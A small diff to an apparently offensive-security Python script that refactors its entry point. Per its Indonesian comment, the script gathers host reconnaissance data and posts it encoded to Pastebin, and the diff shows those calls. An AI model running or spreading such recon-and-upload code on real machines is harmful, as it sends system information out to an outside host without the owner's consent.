@@ -48,7 +48,10 @@ def pastebin_create_paste(encoded_data):
         print("[*] Create paste SUCCEED")
         print(f"[*] Pastebin URL: {resp.text}")
 
-if __name__ == "__main__":
+def main():
     # melakukan Host Reconnaissance kemudian membuat paste pada pastebin
     host_encoded_data = hostRecon()
     pastebin_create_paste(host_encoded_data)
+
+if __name__ == "__main__":
+    main()
